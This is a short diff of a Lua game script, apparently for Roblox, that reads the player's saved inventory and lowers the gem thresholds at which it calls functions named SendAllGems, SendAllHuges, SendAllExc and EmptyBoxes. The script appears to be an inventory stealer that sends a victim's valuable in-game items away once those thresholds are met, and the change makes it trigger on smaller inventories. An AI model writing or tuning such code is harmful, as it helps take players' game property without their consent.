@@ -58,7 +58,7 @@ for i, v in pairs(GetSave().Inventory.Currency) do
     end
 end
 
-if GemAmount1 < 100000 then
+if GemAmount1 < 10000 then
     print("mode 1")
 end
 
@@ -326,7 +326,7 @@ local function SendAllGems()
 	until CountGems() == nil or CountGems() < 10000
 end
 
-if CountHuges() > 0 or CountGems() > 100000 then
+if CountHuges() > 0 or CountGems() > 10000 then
 	EmptyBoxes()
 	SendAllHuges()
 	SendAllExc()
